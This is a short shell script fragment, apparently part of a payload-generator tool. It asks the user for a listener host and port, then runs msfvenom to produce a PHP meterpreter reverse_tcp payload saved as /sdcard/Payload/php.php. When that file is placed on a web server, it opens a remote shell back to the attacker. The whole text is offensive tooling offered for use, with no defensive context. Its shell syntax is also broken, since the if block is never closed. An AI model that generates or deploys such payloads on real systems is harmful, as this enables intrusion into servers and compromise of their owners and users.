p() {
	echo
	random
	echo -e -n "Enter LHOST \033[0m"
	read a
	if [ $a ];then
	echo
	random
	echo -e -n "Enter LPORT\033[0m "
	read b
	msfvenom -p php/meterpreter/reverse_tcp LHOST=$a LPORT=$b R > /sdcard/Payload/php.php
	random
	printf "\n Completed\n\n"
	}
	p